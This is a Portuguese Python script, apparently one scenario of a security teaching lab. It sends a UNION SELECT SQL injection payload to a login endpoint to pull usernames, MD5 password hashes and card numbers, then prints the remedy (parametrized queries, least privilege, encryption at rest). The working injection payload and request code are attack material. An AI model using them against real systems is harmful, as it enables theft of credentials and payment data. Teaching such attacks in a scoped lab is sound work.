"""
CENÁRIO 02 · SQL Injection — exfiltração com UNION SELECT
Camada de aplicação · CIA: Confidencialidade.

Depois do bypass, o atacante usa UNION para fazer a consulta devolver colunas de
outra tabela (aqui, usuário/senha-hash/cartão). A query original seleciona 6
colunas (id, usuario, senha_md5, papel, cartao, saldo), então o UNION precisa de
6 colunas no mesmo tipo/posição.
"""
from config import checar_escopo, titulo, sessao

ALVO = checar_escopo()


def main():
    titulo("02", "SQL Injection com UNION", "Aplicação / Confidencialidade")

    # Alinhado às 6 colunas da tabela usuarios; traz usuario, senha_md5 e cartao.
    payload = ("' UNION SELECT id, usuario, senha_md5, papel, cartao, saldo "
               "FROM usuarios -- ")
    print(f"\nPayload no campo usuário:\n  {payload}\n")

    r = sessao.post(f"{ALVO}/login", data={"usuario": payload, "senha": "x"})
    try:
        j = r.json()
    except Exception:
        j = {"status": r.status_code, "corpo": r.text[:200]}
    print(f"Resposta do servidor (1ª linha casada):\n  {j}\n")
    print("Com variações do payload o atacante percorre todas as linhas e extrai")
    print("os hashes MD5 — que o cenário 03 quebra.\n")
    print("CORREÇÃO: parametrização, princípio do menor privilégio no usuário do")
    print("          banco e colunas sensíveis cifradas em repouso.")


if __name__ == "__main__":
    main()
